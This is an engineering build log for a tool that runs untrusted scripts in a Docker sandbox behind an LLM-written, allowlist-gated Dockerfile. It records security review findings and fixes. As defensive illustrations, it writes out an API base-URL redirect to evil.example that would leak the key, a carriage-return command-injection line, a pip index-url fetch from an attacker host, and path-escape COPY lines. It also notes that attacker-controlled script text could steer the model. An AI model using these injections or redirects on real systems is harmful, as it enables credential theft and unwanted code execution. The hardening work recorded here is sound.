# Build log

What was built, what broke, and what was decided. Written for someone who has not seen this
project before, so entries are named for what they are rather than for when they were
scheduled.

`README.md` says what runs today and `ARCHITECTURE.md` holds the invariants and the
decision log. This file is the record of how those got that way, including the parts that
were wrong first. Nothing here is tidied after the fact: where a fix was the wrong shape,
the wrong shape is still described, because that is the part worth reading.

Updated 2026-09-02.

## Where this is
Built and tested: the sandbox that holds the untrusted script, the model layer, the
deterministic gate every Dockerfile passes before a build, the LangGraph agent that is now
the only engine, the workspace that is the only code here handling a path, the closed event
vocabulary with its provenance labels, the command line, and the two tools the model uses
to read the part of a script it was not shown.

Everything runs through the graph. The command line builds it, the `while` loop is
deleted, and the hand-written provider path is gone: `make_llm` returns a LangChain chat
model and the graph binds tools to it in one place.

Not built: the verdict and the trace. The command line reports what a script did and what
it cost; nothing yet decides what that behaviour means.

352 tests, 335 of which need neither Docker nor an API key. The rest skip
automatically when no daemon is present. Both suites run on every push
and every pull request.

## The default provider, decided 2026-08-22
`anthropic:claude-sonnet-5`. The native SDK with strict tool use, which is the only path
that grammar-constrains Claude's arguments, and cheap enough that the capped repair loop can
spend its attempts without cost being the reason a run stops.

This was a decision with nothing implementing it until 30 August: `make_llm(spec)` requires
a spec, and nothing chose one because nothing started a run without being handed one. The
command line was the first caller that had to pick, and it is where the default now lives,
as `DEFAULT_SPEC` in `envforge/__main__.py`.

## It runs, 2026-08-30
`envforge/__main__.py`. The first caller this project has had. Everything under it was
driven by tests until now, and the first real run is the only reason the two things below
were found rather than deferred again.

The run, verbatim, against a script importing `requests` and reaching for the network:

    asking               attempt 1: asking for a Dockerfile
    wrote                got 142 characters
    building             building envforge-c32a02687da...:attempt1
    running              running envforge-c32a02687da...:attempt1
    finished             the script ran and exited 0

    --- the Dockerfile that was built ---
    FROM python:3.11-slim
    COPY hello.py /app/hello.py
    RUN ["pip", "install", "--no-cache-dir", "requests"]
    ENTRYPOINT ["python", "/app/hello.py"]

    --- what the script did (exit 0) ---
    [stdout, written by the container, not by us]
      | resolving example.com ...
      | network refused, as expected: ConnectionError
      | done

One model call, 1692 tokens. The build had network, since pip needed it, and the run did
not, which is the line the whole design rests on and which had never been demonstrated
outside a test before.

**Two failures a command line cannot ship with.** Both are the same mistake in different
places: a run that cannot say honestly that it failed.

A spent budget fell back to the Dockerfile we write ourselves, copying the shape of a
second refusal. A refusal is the model judging the script, which is information about the
script. A spent budget is information about us. Building on it printed a verdict no
judgment went into and called it a success. It now ends the run, which is also what makes a
generous ceiling safe: hitting it means something went wrong rather than that an allowance
ran out.

A provider failure was not caught at all. A dead key, an empty account and a rate limit are
none of the three `LLMError` types the loop handles, so each escaped the generator: no
outcome, no `finished` event, and whatever had been spent unrecorded. They are now one
`ProviderUnavailable`, deliberately not an `LLMError` so it cannot reach the repair path.
If it ever did, we would build our own Dockerfile, run it, and print an ordinary-looking
verdict on a run the model never saw.

**The first report hid the product.** It printed the exit code and stopped, so the actual
output of the script, which is the only thing this tool exists to show, was not there. Found
by running it, not by reading it. The report now ends with what the container wrote,
labelled as the container's words rather than ours.

**Where the leak test was too narrow.** It scanned Markdown only, and eleven pieces of
internal vocabulary were still in the Python files, including one in a docstring here.
It now scans `envforge/*.py` and `tests/*.py` too. One match was a genuine English use of
the word, reworded rather than exempted, because an exemption list is where a strict check
starts leaking.

268 tests pass, 13 of them against the real daemon.

## What the review found in the command line, 2026-08-30
Blocked on first pass. Seven findings, two of them holes this change opened. Every one was
demonstrated by running something, not by reading the diff, which is the whole reason the
step exists.

**A sample could redirect our API traffic.** `load_env` read `./.env`. This tool analyses
samples nobody trusts, and running it from the sample's own directory is the natural
workflow, so a `.env` shipped beside a sample was loaded into the process and obeyed.
Setting `ANTHROPIC_BASE_URL` pointed the client at another host, which sends the key there
and lets the sample choose the Dockerfile the gate is handed. Reproduced before the fix:
the variable went from unset to `https://evil.example/v1/`.

Fixed with two rules rather than one. The path is fixed to the project's own directory and
never the working directory, and the names are an allowlist, because "the file is ours" is
a weaker guarantee than it sounds once a file is copied between machines and pasted from
instructions.

**A filename could steer the exit code.** `exit_code_for` matched substrings of the
outcome's `reason`, and `reason` splices in the gate's quoted line, which contains the
script's filename. A script named `x could not be reached.py` produced exit 3, telling a
caller to retry a provider that had answered perfectly well. `Outcome` now carries a typed
`kind` set where the outcome is built, and the exit code switches on that. Prose the sample
influences can no longer reach a machine-readable result.

The same finding had a second half worth more than the first: nothing coupled the producer
to the consumer, so rewording one sentence in the loop changed what the shell learned while
every test still passed. There is now a test that drives the real loop to each terminal
state and asserts the code a shell would actually get.

**Four provider failures still escaped.** The typed wrapper matched connection errors on
the class name, and `APITimeoutError` does not contain the word, though it subclasses the
connection error in both SDKs. Timeouts, 500, 503, Anthropic's 529 and a 404 from a
mistyped model name all escaped as tracebacks, each reproducing exactly the failure this
change claimed to have fixed. Matching is now by inheritance, and 404 and 5xx have their
own kinds.

**Container output could repaint the terminal.** `report` printed what a sample wrote
straight to the TTY, so a sample could clear the screen, set the window title and paint a
convincing `ok` summary, erasing the label saying the output was not ours. Control
characters are now escaped. The gate has refused non-printables for this exact reason since
August; the report was the one attacker-controlled channel to a terminal without the rule.

**Docker being absent or stopped was unhandled.** A stopped daemon looked like three failed
builds, spent three paid repair calls on a Dockerfile that was already correct, and then
reported the script as having run and failed. It now has its own exit code.

**`--check` was broken for two of three providers.** It passed `limit` to `models.list()`,
which the OpenAI SDK does not accept, so a working OpenAI or Groq key was reported as
unusable and the bare `except` hid that it was our bug.

**Two stale sentences and a stale table row**, all saying a spent budget falls back, and one
claiming no command line exists. Retired in the same commit.

The provenance value was wrong too: `provider_unavailable` was labelled `TOOL`, and the
provider's error text is neither a tool result nor the model's words. `PROVIDER` was added
rather than overloading `TOOL`, whose real user is about to be the tool loop.

272 tests pass.

## The second review, and the fix that was defeated by its own call site, 2026-08-30
Blocked again. Two of the seven fixes from the first pass did not hold, and both were
invisible in a diff: the suite was green while a failed run reported success and while a
sample's configuration was still being read.

**The `.env` fix never ran in production.** The function pinned the path to the project's
own directory. `main` then called it as `load_env(Path.cwd())`, so the parameter won and
the constant was never used. The test passed because it called the function rather than the
program. The allowlist added at the same time did hold, so the redirect was blocked, but a
sample could still choose which account paid for the run and remove the cost ceiling.

The lesson is narrow and worth keeping: a fix inside a function proves nothing about the
program until a test drives the entry point. The replacement test calls `main` from a
hostile directory, which is the only version of the check that could ever have failed.

**A failed run exited 0.** `Outcome.kind` was set on five terminal paths and missed on the
sixth, the one that gives up after three attempts. Its default was `"ran"`, so the CLI
printed FAILED and told the shell everything was fine. `Kind` is now a closed `Literal`
with no default, which turns the same mistake into a `TypeError` at construction.

The same finding had a second half. The success path set `"ran"` whatever the container did,
so a script exiting nonzero also reported 0 and the documented meaning of exit 1 was
unreachable. Three records described a behaviour the code could not produce.

**Five smaller ones.** 400 and 408 still escaped the provider wrapper, and a 400 is what
both providers return for a prompt over the context window, which this tool can produce.
`printable` kept newlines, so a single string reaching the summary could paint whole forged
lines with no control character in it, and it let bidirectional overrides through, which
reverse a line's reading order without one either. A stopped daemon still cost three paid
repair calls before reporting the script as having run. A `docker version` probe before the
loop covers the daemon being down at the start; a third review showed the probe alone was
not enough, since a daemon that stops mid-run makes every build fail with exit 1, which the
loop reads as a repairable Dockerfile problem. The probe is now repeated on the first build
failure, before a repair is paid for. `evidence = str(exc)` was the one evidence path with no bound, and a
provider message carrying model-chosen text put 200,000 characters into the next prompt.
And 108 images had accumulated. Cleanup went into the CLI's `finally`, which a third
review showed covered only the CLI: the Docker test suite still leaked one image per run,
because the seam existed and the tests using that seam did not. Both clean up now.

One correction to the review: it estimated the images at 21GB. Layers are shared, so
`docker system df` reports 540MB. The clutter was real and the number was not.

276 tests pass.

## The fourth review, and a regression the fix itself introduced, 2026-08-30
Blocked again, and the blocking finding was a regression created by the previous round's
fix. Worth recording in full, because the failure is not the bug but the way it survived.

**The credential check locked out a working credential.** The Anthropic SDK resolves
credentials from three slots and the check read two, so anyone authenticated through a
profile rather than an environment variable was told their key was not set. A crash was
traded for a lockout.

The test enshrined it. It deleted two environment variables, which cannot reveal a third
slot, so on a machine authenticated by profile it passed *because* the code was wrong. The
review also found the suite was host-dependent: with a profile variable exported, one test
failed. A test that depends on the host cannot tell you which of the two things it proved.

The same commit left a second traceback. The SDK's constructor raises when a named profile
is missing or corrupt, which was uncaught, so the traceback that round three removed had
simply moved one line earlier.

**Two tests were fake, and only mutation showed it.** The review changed the code and
checked whether the suite noticed. It did not, twice. The headline table was asserted by
grepping the function's source, so deleting an entry while leaving the word in a nearby
comment passed everything while a spent budget silently degraded from STOPPED to FAILED.
And the rule that the daemon is re-probed on every build failure, not only the first, was
prose: making it fire once left 271 tests green.

Both are now set equality against a module constant, and a test that puts the daemon's
death on the second build, where a first-only probe cannot see it.

**Found by running it afterwards, not by any review.** A cold base image took longer to
pull than the build timeout. The loop called that a broken Dockerfile, so it paid for a
second call in which the model rewrote the identical 142 characters, and the build then
worked because the pull had cached. `BuildResult` has carried `timed_out` all along and
the loop ignored it. The model cannot see a clock, so asking it again is asking the wrong
question at full price, and this is precisely what `agent.py`'s opening rule forbids. A
build timeout is now its own ending and costs one call.

Four stale record sentences went with it, one of them created by this branch: the
vocabulary grew from twelve kinds to thirteen, and a paragraph reading "a fifth provenance
was considered and refused" sat directly above the commit that added a fifth.

290 tests pass.

## The fifth review, scoped to the fixes nothing had checked, 2026-08-31
The three most recent commits had never been read by anything but their author, so a review
was run against that range alone and told not to accept it on the strength of the earlier
rounds. It blocked, on the third instance of one pattern.

**A fix that moved the traceback instead of removing it.** `MissingKey` is a subclass of
`ProviderUnavailable`, and both command line entry points caught only the subclass, so the
parent, which the SDK constructor raises for a missing or malformed credential profile,
escaped as a traceback and exit 1. Exit 1 is defined here as the script running and
failing, so a setup mistake reported itself as a finding about the sample, and the
traceback bypassed the escaping, putting an environment-derived path on the terminal raw.

The test that was supposed to cover this asserted `AnthropicLLM` raises the right type. Its
name claimed a property of the command, and nothing checked the command. That is the same
shape as the fake tests the previous round found, and it is the third round in a row where
a fix was correct in the library and absent from the program. The new test drives `main`.

**A mutation survived, and it was the whole content of the previous commit.** Flattening
the agent's kind to `unavailable` left every test green, because one test proved the
provider layer produces `rejected` and another built the outcome by hand. Nothing joined
them. The path worked, so this was a coverage hole rather than a live bug, but it is the
hole shape that blocked round four.

**Unmapped statuses were still escaping.** 402, 409, 413 and 422 re-raised out of the
generator with no outcome and unrecorded spend, which is the failure the wrapper exists to
prevent. Enumerating statuses always misses the next one, so anything unmapped now falls to
a side rather than to the floor: a 4xx is the provider refusing what we sent, anything else
is the provider not serving us.

Also from the same review, and accepted: a malformed docker command is our bug rather than
the caller's, so `SandboxError` moves from exit 2 to exit 7, which is what 7 was created to
mean; and `--check` was reporting a rejection as exit 3 while a run reported it as 7.

**Two of its arguments were declined, with reasons.** It suggested separating a
context-window 400 from a malformed-request 400. Both providers return the same error type,
so the split would need the provider's prose, which is exactly the substring matching
invariant 22 bans. It also suggested one free rebuild on a build timeout, since buildkit
keeps the pulled layers and the incident that motivated the ending would then have
succeeded. That is a good idea and it is a behaviour change, so it went to LATER rather
than into a branch already blocked five times.

296 tests pass.

## The sixth review, and a test that could not fail, 2026-08-31
Scoped to the previous commit alone. Two blockers, and the first is the worst thing in this
whole branch.

**I wrote an assertion with an escape hatch.** The new status test read
`assert kind in (expected, "unavailable")`, and since `"unavailable"` was always accepted
the assertion held for every possible answer. The test could not fail. The review proved it
by flattening the mapping to `"unavailable"` and watching the suite stay green, which meant
a 402 or a 422 would print "the model could not be reached", the exact false sentence the
commit before it existed to remove, and CI would not have noticed.

Tightened to `== expected`, and then mutated again by hand to confirm it now goes red. That
second step is the one worth keeping as a habit: a test written to kill a mutation should be
run against that mutation before it is believed.

**Two entry points carried two copies of one rule.** `reachable` widened `rejected` to
every 4xx while `--check` stayed on 400 alone, so a 422 was "our bug, do not retry" from a
run and "provider unavailable, retry" from `--check`, for one event. The record already
claimed they had been made to agree, which was true only for 400. The mapping is now one
named function that both call.

The test written for that was worthless and a seventh review proved it. It computed both
sides from the same value, so it asserted that two constants matched, thirteen times, and
it survived putting the exact bug back. The replacement drives `check_key` and `main` for
real and compares what each returns, and it was run against that mutation before being
believed. That last step is the difference between a test and a hope, and skipping it is
how the previous two rounds shipped assertions that could not fail.

**A blanket rule got a real case wrong.** 402 is Payment Required, which is an exhausted
account and the same event as a 403 billing error. Sweeping every 4xx into `rejected` told
someone out of credit that the fault was ours and not to retry. Statuses a provider gives
its own meaning to are read first now, and only the rest fall through.

**A traceback was still reachable.** An unreadable script raises `PermissionError` out of
the workspace, which is an `OSError` and was not guarded, so the run died with a raw
traceback carrying an unescaped path and exit 1, meaning the script ran and failed. The same
shape as the credential crash, one commit later.

**And a documented command did not work.** README and CLAUDE.md both call `python -m pytest`
the suite that needs no daemon, and without Docker thirteen tests errored rather than
skipping. A `conftest.py` skips them when no daemon answers, so the sentence is true rather
than reworded. CI still runs them explicitly against a real daemon.

Also asserted: every headline and every exit value, not only the keys. Mutating `budget`
from STOPPED to FAILED had survived, and so had `unavailable` to `ok`, which would have
printed `ok` above exit 3.

300 tests pass, 287 without a daemon.

## The token budget, deleted, 2026-09-01
Pushback on how much of this project had grown around token accounting, and it was right.
The whole module is gone.

It could not fire. Seven calls was the worst a run could make, `max_attempts` capped it
there, and seven worst-case calls estimate to 150,000 tokens against a 256,000 ceiling.
Measured before deleting, not assumed. A ceiling that cannot be reached is not a bound, it
is a comment with a runtime cost.

Past tense throughout, because the looking tools ended that arithmetic one change later:
the worst case is sixteen calls and 320,000 tokens, past the same ceiling. The deletion
still stands on `max_attempts`, which now caps looks as well as builds, but "it cannot
fire" is no longer the reason. This paragraph was left in the present tense when ADR-015
was corrected, and a review found it: adding the correction somewhere else in the file is
not the same as retiring the false sentence.

`can_investigate`, the half that held a reserve back for the producing call, was never
called by anything. It was built for a tool loop that did not exist, on the argument that a
loop written against a turn counter would be a rewrite later. That argument is exactly how
speculative code gets in: adding it now is always cheap, and the price arrives later as
surface. This one cost an exit code, an `Outcome` kind, an event kind, a terminal path in
the loop, a CLI flag, an environment variable and a share of seven review rounds, to hold
16 lines of logic inside 65 lines of prose defending them.

265 lines came out across seven files and nothing that ever ran was lost.

What checking the industry showed. The norm for a small agentic CLI is an iteration cap,
which this already had: LangChain defaults to fifteen, LangGraph to a recursion limit of
twenty-five. The sharper advice is a no-progress guard that halts when the same tool and
error repeat, since step caps fire after the money is spent. Cost control belongs at the
account, and Anthropic's console carries organisation and per-workspace monthly limits, set
comfortably above normal spend so they never trip. One setting in a web console against 107
lines in a repository.

`Usage` survives, moved into `agent.py`. Counting what a run cost is a feature and the
report prints it. Counting is not enforcing, and conflating the two is what produced the
module.

287 tests pass.
## The free rebuild a timeout is worth, 2026-08-31
The seventh review argued for this and it went to the backlog rather than into a branch
that had been blocked five times. Taken up now that the command line has merged.

A build timeout ended the run. That was right about the model, which cannot see a clock, so
asking it to fix a file that timed out produces the identical file at full price. It was
wrong about the build: buildkit keeps the layers a cancelled pull managed to fetch, so the
same Dockerfile often succeeds on a second try, and the incident that motivated the ending
was exactly that, a cold base image pulling past the ceiling.

So the first timeout buys one rebuild of the identical file, which costs wall clock and no
tokens. Once, not until it works, because a Dockerfile that genuinely asks for more work
than the timeout allows would otherwise retry forever at full build cost, and the honest
ending for that is the one already there. The flag is run-scoped rather than
attempt-scoped, so a file that always times out cannot buy a fresh retry every attempt.

Both properties were mutation-tested before being believed: removing the rebuild fails two
tests, and making it unbounded fails one. That step is what the last three rounds were
missing.

302 tests pass.

## Keys come from a .env, reversed 2026-08-30
The original decision said the key was read from the environment and never from a file.
That is now the opposite: `.env.example` ships in the repository, a developer copies it to
`.env`, and the command line entry point loads it.

The reversal is recorded rather than the old sentence quietly deleted, because the reasoning
changed and not the facts. Reading from the environment is marginally safer, since a secret
in a process environment is not a secret on disk. It is also the wrong trade for a project
whose main cost right now is that nobody can run it: a `.env` with a checked-in example is
what a person cloning this expects, and every extra step between cloning and a first run is
a step where they stop.

What actually holds the line is unchanged and is now enforced rather than remembered. `.env`
is in `.gitignore`, `.env.example` carries placeholders only, and a test asserts both: that
`.env` is ignored by git, and that nothing in the example file looks like a credential. The
risk in this pattern was never the file, it was the day someone pastes a real key into the
example and commits it.

## The gate
An allowlist of six instructions and nothing else: FROM, COPY, RUN, USER, CMD, ENTRYPOINT.
No WORKDIR, no ENV, no ADD, no ARG, no SHELL, no multi-stage.

Continuations are refused before any other check, and that ordering is the point rather
than a detail. With no continuations every physical line is a whole instruction, so a
per-line allowlist is a sound analysis instead of a heuristic. Allow them and an
instruction can begin on a permitted line and do its work on the next one.

Four rules worth naming:

1. The written `FROM` must equal the declared `base_image`. Until this existed the
   separate declaration was decoration, and a model could declare one image and build
   another.
2. `FROM` may not name a registry host. `evil.attacker.com/img:1` is a valid reference,
   and building it makes the daemon pull from a host the attacker chose.
3. `RUN` is exec form, like `CMD` and `ENTRYPOINT`. There is no shell, so its arguments
   are a list we check one at a time rather than a string we match a prefix against.
   Every argument after the command must be a named package or one of four flags, so a
   URL, a git reference, a local path, or `--index-url` is refused.
4. `CMD` and `ENTRYPOINT` must be exec form. Shell form re-splits inside `/bin/sh -c`,
   which is the string-versus-list problem the sandbox already refuses to make with the
   docker command itself.

A digest is refused even though it pins harder than a tag, because a digest pins to one
architecture and the laptop is arm64 while CI is amd64.

The gate splits on `\n` and nothing else, exactly as Docker does, and refuses any
character that is not printable, a newline or a tab. Parser directives are refused too,
since `# escape=` changes which character continues a line.

## The carriage return, and why the first fix was the wrong shape
Reported 2026-08-24 by a review session and reproduced against the daemon before anything
changed. A lone `\r` is a line break to Python's `splitlines` and not to Docker, so this
was allowed:

    RUN ["pip", "install", "flask"]\rCMD ["$(echo INJECTED-AT-BUILD-TIME >&2)"]

The gate split it into two valid exec-form instructions. Docker kept it as one line,
failed to parse it as JSON, fell back to shell form, and ran the whole thing through
`/bin/sh -c` during the phase that has network. The injected command printed before the
build then failed with 127, which the loop would have called a repairable build failure
and retried, so the attacker got their execution and the agent tried again.

The reported fix was to add `\r` to the list of refused characters. That list was the
bug. It was written the same day to enumerate what `splitlines` breaks on and Docker does
not, and it omitted the most common member of its own category, which is what a blocklist
eventually does.

Replaced with two things that are properties rather than enumerations. The gate now splits
on `\n`, so its notion of a line is Docker's by construction. And the only characters
permitted anywhere are printable ones, newlines and tabs, which is an allowlist like every
other rule in the file and refuses things nobody thought of.

The cost is that CRLF Dockerfiles are refused, and that is chosen rather than accidental:
accepting them means telling a bare carriage return from one before a newline, and that
distinction is precisely what produced the bypass.

## What a second model found in the gate, 2026-08-24
Three real findings, all reproduced against the function before anything changed.

`RUN` as a string prefix meant `pip install` also matched
`pip install --index-url https://evil.example/ foo`, along with URLs, git references,
local paths and `--target /etc`. The allowlist read as "only installs happen here" while
permitting a fetch from any host during the one phase that has network. Moving `RUN` to
exec form is what closed it, because arguments became inspectable individually.

The metacharacter ban refused `pip install "flask>=2.0"`. `>` and `<` are redirection
operators and version-specifier operators at once, and a raw character scan cannot tell
them apart, so the normal way to pin a dependency was refused and the repair evidence
pointed at the wrong problem. Exec form removes the shell, so the ban is unnecessary
rather than merely relaxed. Verified against a real build: exec-form `RUN` resolves
through `PATH` and `flask>=2.0,<4` installs as 3.1.3.

`COPY` checked its source and ignored its destination, so `COPY s.py /etc/passwd` and
`COPY s.py /usr/local/bin/python` both passed. Destinations are now confined to `/app`.

That first fix was itself defeated, on 2026-08-25, by the first `..`. A prefix test on the
raw string passes `COPY s.py /app/../escaped/s.py`, and Docker writes the file to
`/escaped/s.py` with `/app` never created, verified against the daemon. The destination is
now normalised with `posixpath.normpath` before the containment test, which is the
difference between checking the string and checking the destination. The same change makes
the idiomatic `COPY s.py /app` legal, which the first fix refused and which would have
spent a repair attempt on every run that reached for the obvious form.

One finding was not a bypass and is worth keeping in view: Docker Hub is not a trust
boundary. Anyone can publish there, so `FROM eviluser/backdoor:1.0` is inside the rules
as written. The registry-host rule stops the daemon pulling from a host the attacker
named; it does not make the image trustworthy.

The repair loop: `envforge/agent.py` and `tests/test_agent.py`.
231 tests today, 218 needing neither Docker nor an API key, 13 against the real daemon.

## The repair loop
The plain repair loop. It defines `write_dockerfile` against the schema `Tool` already
enforces, asks, gates, builds, runs, and decides one thing over and over: could a
rewritten Dockerfile fix this. It yields `Event`s rather than printing, and the final
event carries an `Outcome`, so the graph engine and the trace module attach to
the same seam. There is still no `__main__`, so nothing runs from a shell.

Repairable, and each one spends an attempt: a gate rejection, a failed build, exit 126 or
127, and a reply that was refused-adjacent rather than refused, meaning `InvalidArguments`,
`Truncated`, or no tool call at all.

Terminal, because the script ran and what it did is the tool loop's problem: exit 0, exit 1,
exit 137, a 125 that came with a cidfile, and a timeout. A timeout is not a repair
candidate. The run happened.

Four decisions worth naming:

1. `gate` is a required constructor argument with no default. Every Dockerfile reaching
   the daemon was written by a model that just read untrusted text, so a loop that can be
   constructed without a gate is a loop that can build one unchecked. The gate fills in
   the real allowlist; the tests pass an explicit stub.
2. Repair is decided by whether the container started, not by its exit code. `RunResult`
   carries `start_error`, read from the daemon before the force-remove. This closes the
   gap the sandbox left open, and closes it better than the 126/127 test it replaced: those
   codes can be produced by a script that wants to look like a broken image, and a script
   that can choose an exit code has already started, so the field is empty for it.
3. The fallback Dockerfile goes through the same gate. One path from a Dockerfile string
   to the daemon, whoever wrote it. If our own fallback fails our own gate, the loop stops
   and says so rather than asking the model again.
4. The script text is bounded before it enters the prompt, for the same reason container
   output is bounded in the sandbox. Both are attacker-controlled text on the way to a
   model.

The model layer: `envforge/llm.py` and `tests/test_llm.py`.
48 tests, 39 without Docker or any API key, 9 against the real daemon.
The repository is public, and `main` rejects direct pushes: the ruleset requires a pull
request and a green `test` check, verified on 2026-08-23 by a push that was refused.

## The model layer
`LLM` Protocol, `AnthropicLLM` on the native SDK, `OpenAICompatLLM` covering OpenAI and
Groq through `base_url`, `Tool`, `Call`, `validate`, and `make_llm("provider:model")`.
Four failure types, because the loop has to tell them apart: `InvalidArguments` is
repairable, `Refused` is not, `Truncated` means the ceiling was hit, and a bare `LLMError`
means the response had no tool call at all.

`build_request` is a pure function on each provider, the same move as the sandbox's
`build_argv`, so the invariants are tested with no network: `strict` is asked for on
Anthropic and OpenAI, deliberately not on Groq, and `tool_choice` names the tool. It names
it still, whenever one tool is offered, which is every request that asks for a Dockerfile.
The looking tools later added the second shape, where several tools are offered and the
choice becomes "any" rather than a name, and parallel calls are turned off on both
providers so one reply is one tool call.

Four decisions worth naming:

1. `Tool` validates its own schema at construction. Strict mode requires
   `additionalProperties: false` and a `required` list, and both providers enforce that at
   request time. Without the check, a caller's malformed schema arrives as a 400 in the
   middle of the repair loop and reads like a model failure.
2. Groq reads `GROQ_API_KEY` and the key is passed explicitly. Handing the openai client a
   `None` key makes it fall back to `OPENAI_API_KEY`, which would send an OpenAI secret to
   Groq's servers and surface as a 401 from the wrong provider.
3. The tool call is found by scanning `content`, never by index. Scanning is right
   whatever a reply contains, which is the whole reason to scan. The justification first
   written here, that thinking is adaptive by default and so the first block is usually a
   thinking block, was never verified and is not claimed: no `thinking` parameter is sent
   on these requests.
4. `Call.model` is read off the response rather than copied from the request, so the trace
   records what actually answered.

The fakes build their canned responses through `anthropic.types.Message.model_validate`
and `openai.types.chat.ChatCompletion.model_validate`. A payload that could not have come
from the real API fails the test instead of passing it.

The sandbox: `envforge/sandbox.py` and `tests/test_sandbox.py`.
24 tests, 15 without Docker and 9 against the real daemon, all passing.
A `.venv` with pytest exists in the repo directory and is gitignored.
Why the memory test asserts both exit 137 and the absence of `MemoryError` in
stderr is recorded below.

## The sandbox
`Sandbox` protocol, `DockerSandbox`, `Limits`, `BuildResult`, `RunResult`, `SandboxError`.
The two argv builders `build_argv` and `run_argv` are pure functions returning a list,
so the invariant tests read the argv the code actually builds without touching Docker.
Every hardening flag from ARCHITECTURE.md invariant 5 has a test, and so does the absence
of `--network` on build and the placement of script arguments after the image name.

Three decisions worth naming:

1. Exit code 125 is ambiguous. Docker returns it when the CLI rejects our command, and a
   hostile script can call `exit(125)` to imitate that. `--cidfile` settles it: docker
   writes the file only once the container exists, so 125 with no cidfile raises
   `SandboxError` and 125 with one is returned as data. Our bug crashes, the script's
   behaviour feeds the repair loop.
2. `--memory-swap` is set equal to `--memory`. Verified by reading the cgroup back from
   inside a container on 2026-08-22: with the pin, `memory.max` is 134217728 and
   `memory.swap.max` is 0. Drop the flag and `memory.swap.max` becomes 134217728 too, so
   the container gets a second 128m of swap and the cap means twice what it says.
3. Output is bounded head plus tail, not head alone. The head says what ran and the tail
   says how it died, and a truncation marker names the number of bytes cut.

Two smaller ones: the build context is a temp dir holding exactly the Dockerfile and the
script, so the daemon never receives the working directory, and `HOME=/tmp` is set on the
run because a read-only root without a writable home fails half of the tooling for
reasons that have nothing to do with the script under test.

## Why the memory test asserts two things
The test requires exit 137 and requires that `MemoryError` does not appear in stderr,
because the two describe different enforcers. `MemoryError` means an allocation was
refused and the process stayed alive to handle it, which is a catchable Python exception:
the script can swallow it and keep running. A cgroup kill is `SIGKILL`, which no code in
any language can catch, block, handle, or ignore. That uncatchability is the entire
property `--memory` buys, so a run that reports `MemoryError` has proved the cap is being
enforced by something the script can negotiate with.

Exit 137 alone proves nothing, since a script can call `sys.exit(137)` to imitate a kill,
the same imitation trick that `--cidfile` exists to defeat for 125. The pair is the claim:
killed from outside, not stopped from inside.

Both facts are therefore asserted as one tuple rather than two statements. Sequential
asserts stop at the first failure, so the run that matters most, 137 together with a
`MemoryError`, would report only `assert "MemoryError" not in stderr` and hide the exit
code that makes it the worst case. The single assertion prints
`was (137, True), wanted (137, False)`, checked by forcing the failure on 2026-08-22.

## Host facts, measured not assumed
Read back on 2026-08-22 from inside a container on this machine:
cgroup v2 (the v1 path `memory/memory.limit_in_bytes` does not exist), `--memory 128m`
lands as exactly 134217728 bytes, and `ulimit -v` under our own run flags is `unlimited`,
so `RLIMIT_AS` is not a second ceiling competing with the cgroup. Three of the four
candidate causes for a memory-test failure are therefore settled by observation. The one
that remains theory is the Docker Desktop VM running out of memory itself, which needs
total container memory above the VM's own size to reach.

## The 126 witness, found by experiment 2026-08-23
The loop first treated exit 126 and 127 as repairable outright, with the attempt cap as
the only defence against a script exiting 126 to look like a broken image. A probe settled
it: two images that both exit 127, one with a broken `ENTRYPOINT` and one whose script
calls `exit 127`. The broken one leaves `State.Error` on the container with the full runc
message naming the missing file, and the imitator leaves it empty. The docker CLI also
writes its half to stderr, which the sandbox was already capturing without knowing what it
had.

So the witness existed, and the mechanism now rests on it instead of on the exit code. Two
Docker tests assert both directions, because a witness nobody checked against the real
daemon is an assumption.

## Size, settled 2026-08-23
There is no line budget any more. The old rule said roughly 650 including tests and was
being compared against the source number alone, so it read as nearly met while the real
total was 1483. Raising it would have kept the actual problem: the count was changing the
code, trimming docstrings that carried the reasoning and opening three entries in a row
with a note about length instead of the work.

What replaces it is not countable. A file whose responsibility cannot be stated in one
sentence is doing two things and wants splitting, and a module that wants a subdirectory
has outgrown the project.

## What the gate does not do, stated rather than implied
`pip install <name>` runs that package's own setup code at build time, and build has
network. No allowlist of Dockerfile instructions can prevent that, because installing
packages is the product. It is contained by the container and by the fact that the run
phase trusts nothing the build produced, not by the gate.

Whether the RUN allowlist is workable has not been measured, because no real model has
written a Dockerfile against it yet. `apt-get update && apt-get install -y foo` is the
idiomatic form and is refused, so the model must write two RUN lines. The first live call
will show whether that costs repair attempts. Excluding WORKDIR and ENV is the same
question and follows CLAUDE.md's list exactly.

## Languages, settled 2026-08-25
Python and Bash, and now the code says so rather than only the README. Nothing validated
the language before, so a Ruby script was simply passed to the model, which usually
answered, and the run looked like it worked. Two refusals then reached
`default_dockerfile`, which has no base image for Ruby and raised `ValueError` straight
out of the generator.

An unsupported language is now refused before the model is consulted at all, and the
refusal is an `Outcome` like any other rather than an exception. Bash also gained its
first test, having been claimed since the first commit and exercised by nothing.

Where the label comes from, decided 2026-08-25 after a second model reviewed it: the file
extension, with a CLI flag to override, and never the model. `language_for()` reads the
extension and nothing else. A shebang would be more accurate and would mean reading
attacker-controlled content to make the decision.

The honest form of that rule matters, because the first version of it was wrong. "The
model may not decide the language" is not a security rule here. A model-decided label is
still bounded by the door check, so it could only steer between python, bash and refusal,
and the gate checks whatever follows either way. It survives as an engineering rule for
two concrete reasons rather than as a principle. Asking the model would mean every run
sends attacker text to a model before the door check, which is exactly what the door check
was added to prevent. And the refusal boundary would become steerable by script content: a
Ruby file opening with a comment claiming to be Python could flip itself from refused to
attempted, so the same file would not be handled the same way twice.

`DEFAULT_BASE` and `DEFAULT_COMMAND` are now one `LANGUAGES` table, so adding a language is
one entry rather than three that can disagree. The gate deliberately does not import it: it
decides what may run during a build and has no business knowing what language anything is.

What a third language actually needs is not a `LANGUAGES` entry. It is an entry in the
gate's `RUN_COMMANDS`, which today permits `pip` and `apt-get` and nothing else, so a Ruby
script with a gem dependency or a Node script with an npm dependency cannot be built no
matter what the model writes.

A wrong label cannot cost a compromise, but it can cost an honest report, and that belongs
to the tool loop. Label a bash script as python, the fallback runs `python /app/s.sh`, it exits
1 on a syntax error, and the loop calls that terminal with `ok=True` because a nonzero exit
is the verdict's problem rather than the loop's. The verdict would then be formed from a
run in which the script's own logic never executed.

## Known gaps
Nothing has hit a real provider. The request shape is asserted against our own builders and
the responses are parsed through the SDKs' own models, which is stronger than a hand-rolled
fake, but no test has proved the Anthropic API accepts the request we build. One live call
would settle it and costs a few cents.

`OpenAICompatLLM` sends no token ceiling. OpenAI and Groq disagree about the parameter name
and neither has been exercised, so nothing was guessed. Anthropic sends `max_tokens`.

